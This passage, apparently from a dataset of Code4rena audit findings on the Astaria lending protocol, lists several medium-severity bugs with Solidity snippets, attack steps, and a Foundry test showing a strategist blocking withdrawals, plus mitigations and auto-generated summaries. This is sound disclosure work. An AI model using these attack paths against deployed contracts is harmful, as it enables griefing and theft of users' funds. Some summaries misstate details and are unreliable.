      "content": "\nERC4626RouterBase.withdraw will approve an amount of vault tokens to the vault, but the amount represents the number of asset tokens taken out by vault.withdraw, not the required number of vault tokens, and since it normally requires less than 1 vault token to take out 1 asset token, it will prevent ERC4626RouterBase.withdraw from using all approved vault tokens.\n\n```solidity\n  function withdraw(\n    IERC4626 vault,\n    address to,\n    uint256 amount,\n    uint256 maxSharesOut\n  ) public payable virtual override returns (uint256 sharesOut) {\n\n    ERC20(address(vault)).safeApprove(address(vault), amount);\n    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {\n      revert MaxSharesError();\n    }\n  }\n```\n\nand since safeApprove cannot approve a non-zero value to a non-zero value, the second call to ERC4626RouterBase.withdraw will fails in safeApprove.\n\n```solidity\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n```\n\n### Proof of Concept\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L41-L52>\n\n### Recommended Mitigation Steps\n\nChange to\n\n```diff\n  function withdraw(\n    IERC4626 vault,\n    address to,\n    uint256 amount,\n-   uint256 maxSharesOut\n+  uint256 maxSharesIn\n  ) public payable virtual override returns (uint256 sharesOut) {\n+   ERC20(address(vault)).safeApprove(address(vault), maxSharesIn);\n+   if ((sharesIn = vault.withdraw(amount, to, msg.sender)) > maxSharesIn) {\n-   ERC20(address(vault)).safeApprove(address(vault), amount);\n-   if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesOut) {\n      revert MaxSharesError();\n    }\n+   ERC20(address(vault)).safeApprove(address(vault), 0);\n\n  }\n```\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#467`](https://github.com/code-423n4/2023-01-astaria-findings/issues/467#event-8415375984)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the ERC4626RouterBase.withdraw function, which is used to approve an amount of vault tokens to the vault. The amount represents the number of asset tokens taken out by vault.withdraw, not the required number of vault tokens, and since it normally requires less than 1 vault token to take out 1 asset token, it will prevent ERC4626RouterBase.withdraw from using all approved vault tokens. This is because the safeApprove function cannot approve a non-zero value to a non-zero value, and the second call to ERC4626RouterBase.withdraw will fail in safeApprove.\n\nTo mitigate this issue, the code should be changed to include a maxSharesIn parameter and an associated safeApprove call, and a call to reset the allowance to 0. A proof of concept is available on Github, and SantiagoGregory (Astaria) has confirmed the issue via duplicate issue #467.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/228",
      "tags": [
        "EIP-4626",
        "ERC4626"
      ],
      "finders": [
        "cccz",
        "0Kage"
      ]
    },
    {
      "id": "25837",
      "title": "[M-21] When a private vault offers a loan in ERC777 tokens, the private vault can refuse to receive repayment in the safeTransferFrom callback to force liquidation of the borrower's collateral",
      "impact": "MEDIUM",
      "content": "\nWhen the borrower calls LienToken.makePayment to repay the loan, safeTransferFrom is used to send tokens to the recipient of the vault, which in the case of a private vault is the owner of the private vault.\n\n```solidity\n    s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token, payer, payee, amount);\n...\n  function tokenTransferFrom(\n    address token,\n    address from,\n    address to,\n    uint256 amount\n  ) external requiresAuth {\n    ERC20(token).safeTransferFrom(from, to, amount);\n  }\n...\n  function recipient() public view returns (address) {\n    if (IMPL_TYPE() == uint8(IAstariaRouter.ImplementationType.PublicVault)) {\n      return address(this);\n    } else {\n      return owner();\n    }\n  }\n```\n\nIf the token for the loan is an ERC777 token, a malicious private vault owner can refuse to receive repayment in the callback, which results in the borrower not being able to repay the loan and the borrower's collateral being auctioned off when the loan expires.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849-L850><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L28-L35><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L366-L372>\n\n### Recommended Mitigation Steps\n\nFor private vaults, when the borrower repays, sending tokens to the vault, and the private vault owner claims it later.\n\n**[androolloyd (Astaria) acknowledged and commented via duplicate issue `#248`](https://github.com/code-423n4/2023-01-astaria-findings/issues/248#issuecomment-1413601598):**\n> ERC777 issues can be quite problematic, the procotol isn't designed to work with 777, fee on transfer tokens, rebasing tokens.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/247#issuecomment-1443371103):**\n > Flagging as duplicate of this issue all findings related to the lack of ERC777 support.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the LienToken.makePayment function in the Astaria protocol. When a borrower calls this function to repay a loan, it uses the safeTransferFrom function to send tokens to the recipient of the vault. However, if the token for the loan is an ERC777 token, a malicious private vault owner can refuse to receive repayment in the callback, which results in the borrower not being able to repay the loan and the borrower's collateral being auctioned off when the loan expires. To mitigate this issue, it is recommended to send tokens to the vault first when a borrower repays, and the private vault owner can later claim it. The protocol is not designed to work with ERC777 tokens, and this issue has been flagged as a duplicate of another issue related to the lack of ERC777 support.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/247",
      "tags": [],
      "finders": [
        "cccz",
        "KIntern\\_NA"
      ]
    },
    {
      "id": "25836",
      "title": "[M-20] Users can liquidate themselves before others, allowing them to take 13% above their borrowers",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L611-L619>\n\nThe `canLiquidate()` function allows liquidations to take place if either (a) the loan is over and still exists or (b) the caller owns the collateral.\n\nIn the second case, due to the liquidation fee (currently 13%), this can give a borrower an unfair position to be able to reclaim a percentage of the liquidation that should be going to their lenders.\n\n### Proof of Concept\n\n*   A borrower puts up a piece of collateral and takes a loan of 10 WETH\n*   The collateral depreciates in value and they decide to keep the 10 WETH\n*   Right before the loans expire, the borrower can call `liquidate()` themselves\n*   This sets them as the `liquidator` and gives them the first 13% return on the auction\n*   While the lenders are left at a loss, the borrower gets to keep the 10 WETH and get a 1.3 WETH bonus\n\n### Recommended Mitigation Steps\n\nDon't allow users to liquidate their own loans until they are liquidatable by the public.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/281)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a function in the AstariaRouter.sol code called `canLiquidate()`. This function allows a borrower to liquidate their own loan even if the loan has not expired, which gives them an unfair advantage over their lenders. To demonstrate this, a proof of concept was provided where a borrower puts up collateral, takes out a loan, and then liquidates it right before it expires. This allows them to keep the loan and get a bonus of 1.3 WETH. The recommended mitigation step is to not allow users to liquidate their own loans until they are liquidatable by the public. This bug was confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/281",
      "tags": [],
      "finders": [
        "caventa",
        "obront"
      ]
    },
    {
      "id": "25835",
      "title": "[M-19] Users are forced to approve Router for full collection to use commitToLiens() function",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L780-L785><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287-L306><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L233-L244>\n\nWhen a user calls Router#commitToLiens(), the Router calls `commitToLien()`. The comments specify:\n\n`//router must be approved for the collateral to take a loan,`\n\nHowever, the Router being approved isn't enough. It must be approved for all, which is a level of approvals that many users are not comfortable with. This is because, when the commitment is validated, it is checked as follows:\n\n        uint256 collateralId = params.tokenContract.computeId(params.tokenId);\n        ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\n        address holder = CT.ownerOf(collateralId);\n        address operator = CT.getApproved(collateralId);\n        if (\n          msg.sender != holder &&\n          receiver != holder &&\n          receiver != operator &&\n          !CT.isApprovedForAll(holder, msg.sender)\n        ) {\n          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n        }\n\n### Proof of Concept\n\nThe check above allows the following situations pass:\n\n*   caller of the function == owner of the NFT\n*   receiver of the loan == owner of the NFT\n*   receiver of the loan == address approved for the individual NFT\n*   caller of the function == address approved for all\n\nThis is inconsistent and doesn't make much sense. The approved users should have the same permissions.\n\nMore importantly, the most common flow (that the address approved for the individual NFT — the Router — is the caller) does not work and will lead to the function reverting.\n\n### Recommended Mitigation Steps\n\nChange the check to include `msg.sender != operator` rather than `receiver != operator`.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/283)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/283#issuecomment-1439014063):**\n > Keeping medium severity, considering this is a broken functionality.\n\n\n\n***\n\n",
      "summary": "\nThis bug report was filed for the code-423n4/2023-01-astaria repository. The bug was found in the Router#commitToLiens() function. It was observed that the Router must be approved for all, which is a level of approvals that many users are not comfortable with.\n\nThe bug was found in the following lines of code:\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L780-L785><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287-L306><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L233-L244>\n\nThe check in the code allows the following situations pass:\n\n*   caller of the function == owner of the NFT\n*   receiver of the loan == owner of the NFT\n*   receiver of the loan == address approved for the individual NFT\n*   caller of the function == address approved for all\n\nThis is inconsistent and doesn't make much sense. The approved users should have the same permissions. The most common flow (that the address approved for the individual NFT — the Router — is the caller) does not work and will lead to the function reverting.\n\nThe recommended mitigation step is to change the check to include `msg.sender != operator` rather than `receiver != operator`. SantiagoGregory (Astaria) confirmed the bug and Picodes (judge) commented that the severity should remain medium, considering this is a broken functionality.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/283",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "25834",
      "title": "[M-18] Public vault owner (strategist) can use buyoutLien to indefinitely prevent liquidity providers from withdrawing",
      "impact": "MEDIUM",
      "content": "\nBy calling buyoutLien before transferWithdrawReserve() is invoked (front-run if necessary), Public vault owner (strategist) can indefinitely prevent liquidity providers from withdrawing. He now effectively owns all the fund in the public vault.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L295><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L421>\n\nBefore commitLien, transferWithdrawReserve() is invoked to transfer available funds from the public vault to the withdrawProxy of the previous epoch. However, this is not the case for buyoutLien.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L372-L382>\n\nAs soon as there's fund is available in the vault, the strategist can call buyoutLien before any calls to transferWithdrawReserve(), and the withdrawProxy will need to continue to wait for available fund.\n\nThe only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself.\n\nConsider the following test. Even though there is enough fund in the vault for the liquidity provider's withdrawal (60 ether), only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() is preceeded by buyoutLien().\n\n    pragma solidity =0.8.17;\n\n    import \"forge-std/Test.sol\";\n\n    import {Authority} from \"solmate/auth/Auth.sol\";\n    import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n    import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\n    import {\n      MultiRolesAuthority\n    } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n\n    import {ERC721} from \"gpl/ERC721.sol\";\n    import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\n    import {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\";\n    import {VaultImplementation} from \"../VaultImplementation.sol\";\n    import {PublicVault} from \"../PublicVault.sol\";\n    import {TransferProxy} from \"../TransferProxy.sol\";\n    import {WithdrawProxy} from \"../WithdrawProxy.sol\";\n\n    import {Strings2} from \"./utils/Strings2.sol\";\n\n    import \"./TestHelpers.t.sol\";\n    import {OrderParameters} from \"seaport/lib/ConsiderationStructs.sol\";\n\n    contract AstariaTest is TestHelpers {\n      using FixedPointMathLib for uint256;\n      using CollateralLookup for address;\n      using SafeCastLib for uint256;\n\n      event NonceUpdated(uint256 nonce);\n      event VaultShutdown();\n\n      function testBuyoutBeforeWithdraw() public {\n        TestNFT nft = new TestNFT(1);\n        address tokenContract = address(nft);\n        uint256 tokenId = uint256(0);\n\n        address publicVault = _createPublicVault({\n          strategist: strategistOne,\n          delegate: strategistTwo,\n          epochLength: 7 days\n        });\n        _lendToVault(\n          Lender({addr: address(1), amountToLend: 60 ether}),\n          publicVault\n        );\n\n        address publicVault2 = _createPublicVault({\n          strategist: strategistOne,\n          delegate: strategistTwo,\n          epochLength: 7 days\n        });\n        _lendToVault(\n          Lender({addr: address(1), amountToLend: 60 ether}),\n          publicVault2\n        );\n\n        (, ILienToken.Stack[] memory stack) = _commitToLien({\n          vault: publicVault,\n          strategist: strategistOne,\n          strategistPK: strategistOnePK,\n          tokenContract: tokenContract,\n          tokenId: tokenId,\n          lienDetails: standardLienDetails,\n          amount: 40 ether,\n          isFirstLien: true\n        });\n\n        vm.warp(block.timestamp + 3 days);\n\n        IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({\n          vault: publicVault2,\n          strategist: strategistOne,\n          strategistPK: strategistOnePK,\n          tokenContract: tokenContract,\n          tokenId: tokenId,\n          lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 70) / (365 days),\n            duration: 25 days,\n            maxPotentialDebt: 53 ether,\n            liquidationInitialAsk: 500 ether\n          }),\n          amount: 10 ether,\n          stack: stack\n        });\n\n        _signalWithdraw(address(1), publicVault2);\n        _warpToEpochEnd(publicVault2);\n        PublicVault(publicVault2).processEpoch();\n\n        \n        VaultImplementation(publicVault2).buyoutLien(\n          stack,\n          uint8(0),\n          refinanceTerms\n        );\n        \n\n        PublicVault(publicVault2).transferWithdrawReserve();\n\n        WithdrawProxy withdrawProxy = PublicVault(publicVault2).getWithdrawProxy(0);\n\n        assertTrue(WETH9.balanceOf(address(withdrawProxy)) < 20 ether);\n        \n      }\n    }\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nEnforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien).\n\n**[SantiagoGregory (Astaria) confirmed and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1405972473):**\n > @androolloyd - should this still be high severity? This may be a strategist trust issue, but it is more malicious than just writing bad loan terms.\n\n**[SantiagoGregory (Astaria) disagreed with severity and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1418314799):**\n > Since this is more of a strategist trust issue, we think this would make more sense as medium severity. Even with the fix, the issue of malicious refinancing would still partially exist.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1435723056):**\n > I do agree with Medium severity, considering it is a griefing attack by the strategist.\n\n\n\n***\n\n",
      "summary": "\nAstaria is a decentralized finance protocol which allows users to borrow and lend funds from various sources. This bug report details a malicious attack in which a strategist can exploit the Public Vault of the Astaria protocol to prevent liquidity providers from withdrawing their funds. \n\nThe bug occurs when the strategist calls buyoutLien before transferWithdrawReserve() is invoked. This allows the strategist to indefinitely prevent liquidity providers from withdrawing their funds, effectively owning all the funds in the public vault. The only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself. \n\nTo demonstrate the bug, a test was run in which there was enough funds in the vault for the liquidity provider's withdrawal (60 ether), but only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() was preceeded by buyoutLien().\n\nThe recommended mitigation step to fix this issue is to enforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien). The severity of the bug was initially marked as high, but was later decreased to medium by the judge as it is more of a strategist trust issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/324",
      "tags": [],
      "finders": [
        "evan"
      ]
    },
    {
      "id": "25833",
      "title": "[M-17] Position not deleted after debt paid",
      "impact": "MEDIUM",
      "content": "\nIn `_paymentAH` function from LienToken.sol, the `stack` argument should be storage instead of memory. This bug was also disclosed in the Spearbit audit of this program and was resolved during here: <https://github.com/AstariaXYZ/astaria-core/pull/201/commits/5a0a86837c0dcf2f6768e8a42aa4215666b57f11>, but was later re-introduced <https://github.com/AstariaXYZ/astaria-core/commit/be9a14d08caafe125c44f6876ebb4f28f06d83d4> here. Marking it as high-severity as it was marked as same in the audit.\n\n### Proof of Concept\n\n```solidity\nfunction _paymentAH(\n    LienStorage storage s,\n    address token,\n    AuctionStack[] memory stack,\n    uint256 position,\n    uint256 payment,\n    address payer\n  ) internal returns (uint256) {\n    uint256 lienId = stack[position].lienId;\n    uint256 end = stack[position].end;\n    uint256 owing = stack[position].amountOwed;\n    //...[deleted lines to show bug]\n    \n    delete s.lienMeta[lienId]; //full delete\n    delete stack[position]; // <- no effect on storage\n    \n  }\n```\n\nThe position here is not deleted after the debt is paid as it is a memory pointer.\n\n### Recommendation\n\nThe first fix can be used again and it would work.\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/343#issuecomment-1403986276):**\n > So digging into this more since this payment flow is designed to run only once, and the state is stored inside the clearing house not the lien token, I'm not sure this matters, the deletion of the auction stack should be handled seperately inside the clearing house for the deposit.\n\n**[SantiagoGregory (Astaria) acknowledged](https://github.com/code-423n4/2023-01-astaria-findings/issues/343)**\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/343#issuecomment-1435712997):**\n > The description of the impact of the finding is very brief for this issue and its duplicates.\n> \n> @androolloyd - the auction stack is in `ClearingHouse`, but the issue still stands as it is not deleted in `ClearingHouse` although it should be, right?\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/343#issuecomment-1442100489):**\n > > @androolloyd - the auction stack is in `ClearingHouse`, but the issue still stands as it is not deleted in `ClearingHouse` although it should be, right?\n> \n> Yes, it should be.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the `_paymentAH` function from the LienToken.sol program. The bug was originally discovered during a Spearbit audit and was resolved, but then re-introduced at a later time. The bug is that the `stack` argument should be storage instead of memory, meaning that the position is not deleted after the debt is paid. Astaria developers have discussed the bug and agree that the first fix should be used again and it would work. The severity of the bug has been decreased to Medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/343",
      "tags": [],
      "finders": [
        "Lotus",
        "fs0c",
        "obront"
      ]
    },
    {
      "id": "25832",
      "title": "[M-16] WithdrawProxy allows `redeem()` to be called before withdraw reserves are transferred in",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L152-L161>\n\nThe WithdrawProxy contract has the `onlyWhenNoActiveAuction` modifier on the `withdraw()` and `redeem()` functions. This modifier stops these functions from being called when an auction is active:\n\n    modifier onlyWhenNoActiveAuction() {\n      WPStorage storage s = _loadSlot();\n      if (s.finalAuctionEnd != 0) {\n        revert InvalidState(InvalidStates.NOT_CLAIMED);\n      }\n      _;\n    }\n\nFurthermore, both `withdraw()` and `redeem()` can only be called when `totalAssets() > 0` based on logic within those functions.\n\nThe intention of these two checks is that the WithdrawProxy shares can only be cashed out after the PublicVault has called `transferWithdrawReserve`.\n\nHowever, because `s.finalAuctionEnd == 0` before an auction has started, and `totalAssets()` is calculated by taking the balance of the contract directly (`ERC20(asset()).balanceOf(address(this));`), a user may redeem their shares before the vault has been fully funded, and take less than their share of the balance, benefiting the other withdrawer.\n\n### Proof of Concept\n\n*   A depositor decides to withdraw from the PublicVault and receives WithdrawProxy shares in return\n*   A malicious actor deposits a small amount of the underlying asset into the WithdrawProxy, making `totalAssets() > 0`\n*   The depositor accidentally redeems, or is tricked into redeeming, from the WithdrawProxy, getting only a share of the small amount of the underlying asset rather than their share of the full withdrawal\n*   PublicVault properly processes epoch and full withdrawReserve is sent to WithdrawProxy\n*   All remaining holders of WithdrawProxy shares receive an outsized share of the withdrawReserve\n\n### Recommended Mitigation Steps\n\nAdd an additional storage variable that is explicitly switched to `open` when it is safe to withdraw funds.\n\n**[SantiagoGregory (Astaria) acknowledged and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/358#issuecomment-1412910031):**\n > This is intentional, the UI will block people from redeeming early. The option is there both to save some gas, and as a last resort if an LP urgently needs money (it will only make it better for the rest of the LPs).\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/358#issuecomment-1441319563):**\n > I do consider this a valid medium severity issue, considering there is the `onlyWhenNoActiveAuction` so the intent of the code is not to block people from redeeming early but to prevent them from doing so. Note that the sponsor is right to highlight that it could be desirable to have an `emergencyRedeemFunction` where LPs do not wait for the completion of auctions.\n\n\n\n***\n\n",
      "summary": "\nThe WithdrawProxy contract has a bug where users may be able to redeem their shares before the PublicVault has fully funded the contract, and receive less than their share of the balance. This is due to the `onlyWhenNoActiveAuction` modifier on the `withdraw()` and `redeem()` functions, which stops these functions from being called when an auction is active, and both `withdraw()` and `redeem()` can only be called when `totalAssets() > 0`. This bug could benefit other withdrawers if a malicious actor deposits a small amount of the underlying asset into the WithdrawProxy, making `totalAssets() > 0`. \n\nA proof of concept was provided, where a depositor decides to withdraw from the PublicVault and receives WithdrawProxy shares in return. Then, a malicious actor deposits a small amount of the underlying asset into the WithdrawProxy, making `totalAssets() > 0`. The depositor then accidentally redeems, or is tricked into redeeming, from the WithdrawProxy, getting only a share of the small amount of the underlying asset rather than their share of the full withdrawal. This would result in all remaining holders of WithdrawProxy shares receiving an outsized share of the withdrawReserve.\n\nThe recommended mitigation step is to add an additional storage variable that is explicitly switched to `open` when it is safe to withdraw funds. The sponsor of the project commented that this bug was intentional, as the UI will block people from redeeming early, and that the option is there both to save some gas, and as a last resort if an LP urgently needs money (it will only make it better for the rest of the LPs). The judge commented that they consider this a valid medium severity issue, considering there is the `onlyWhenNoActiveAuction` so the intent of the code is not to block people from redeeming early but to prevent them from doing so.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/358",
      "tags": [],
      "finders": [
        "unforgiven",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "25831",
      "title": "[M-15] Overflow potential in processEpoch()",
      "impact": "MEDIUM",
      "content": "\nIn `PublicVault.sol#processEpoch()`, we update the withdraw reserves based on how `totalAssets()` (the real amount of the underlying asset held by the vault) compares to the expected value in the withdraw proxy:\n\n      unchecked {\n        if (totalAssets() > expected) {\n          s.withdrawReserve = (totalAssets() - expected)\n            .mulWadDown(s.liquidationWithdrawRatio)\n            .safeCastTo88();\n        } else {\n          s.withdrawReserve = 0;\n        }\n      }\n\nIn the event that the `totalAssets()` is greater than expected, we take the surplus in assets multiply it by the withdraw ratio, and assign this value to `s.withdrawReserve`.\n\nHowever, because this logic is wrapped in an `unchecked` block, it must have confidence that this calculation does not overflow. Because the protocol allows arbitrary ERC20s to be used, it can't have confidence in the size of `totalAssets()`, which opens up the possibility for an overflow in this function.\n\n### Proof of Concept\n\n`mulWadDown` is calculated by first multiplying the two values, and then dividing by `1e18`. This is intended to prevent rounding errors with the division, but also means that an overflow is possible when the two values have been multiplied, before any division has taken place.\n\nThis unchecked block is safe from overflows if:\n\n*   `(totalAssets() - expected) * s.liquidationWithdrawRatio < 1e88` (because s.withdrawRatio is 88 bytes)\n*   `liquidationWithdrawRatio` is represented as a ratio of WAD, so it will be in the `1e17` - `1e18` range, let's assume `1e17` to be safe\n*   therefore we require `totalAssets() - expected < 1e61`\n\nAlthough this is unlikely with most tokens, and certainly would have been safe in the previous iteration of the protocol that only used `WETH`, when allowing arbitrary ERC20 tokens, this is a risk.\n\n### Recommended Mitigation Steps\n\nRemove the `unchecked` block around this calculation, or add an explicitly clause to handle the situation where `totalAssets()` gets too large for the current logic.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/362)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the `PublicVault.sol#processEpoch()` function in the Astaria protocol. This function updates the withdraw reserves based on the amount of the underlying asset held by the vault. To do this, it must have confidence that the calculation does not overflow. However, because the protocol allows arbitrary ERC20s to be used, it can't have confidence in the size of `totalAssets()`, which opens up the possibility for an overflow in this function.\n\nThe bug is caused by the `mulWadDown` calculation, which is calculated by first multiplying the two values, and then dividing by `1e18`. This is intended to prevent rounding errors with the division, but also means that an overflow is possible when the two values have been multiplied, before any division has taken place. To prevent this, the total assets must be less than 1e61.\n\nTo mitigate this bug, the `unchecked` block should be removed, or an explicit clause should be added to handle the situation where `totalAssets()` gets too large. SantiagoGregory (Astaria) has confirmed this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/362",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "25830",
      "title": "[M-14] `minDepositAmount` is unnecessarily high, can price out many users",
      "impact": "MEDIUM",
      "content": "\nThe `minDepositAmount()` function is intended to ensure that all depositors into Public Vaults are depositing more than dust to protect against attacks like the 4626 front running attack. It is calculated as follows:\n\n      function minDepositAmount()\n        public\n        view\n        virtual\n        override(ERC4626Cloned)\n        returns (uint256)\n      {\n        if (ERC20(asset()).decimals() == uint8(18)) {\n          return 100 gwei;\n        } else {\n          return 10**(ERC20(asset()).decimals() - 1);\n        }\n      }\n\nFor assets with 18 decimals, this calculation is totally reasonable, as the minimum deposit is just 100 gwei (1/10k of a USD). However, for other assets, the formula returns 0.1 tokens, regardless of value.\n\nWhile this may be fine for low-priced tokens, it leads to a minimum deposit for tokens like WBTC to be over `$2000` USD, certainly too high for many user and not aligned with the intended behavior (which can be seen in the 18 decimal base case).\n\n### Proof of Concept\n\n*   WBTC is 8 decimals and has a value of \\~$20k USD\n*   the minimum deposit is calculated as `return 10**(ERC20(asset()).decimals() - 1);`\n*   for WBTC, this would return `10 ** 7`\n*   `20,000 * (10 ** 7) / (10 ** 8)` = `2000 USD`\n\nThis is far out of line with the `1/10,000 USD` expected for tokens with 18 decimals.\n\n### Recommended Mitigation Steps\n\nSince our requirements for the size of deposit are so low, we can customize a formula that ensures we get a small final result in all cases. For example:\n\n    if (ERC20(asset()).decimals() < 4) {\n        return 10**(ERC20(asset()).decimals() - 1);\n    else if (ERC20(asset()).decimals() < 8) {\n        return 10**(ERC20(asset()).decimals() - 2);\n    } else {\n        return 10**(ERC20(asset()).decimals() - 6);\n    }\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/367)**\n\n\n\n***\n\n",
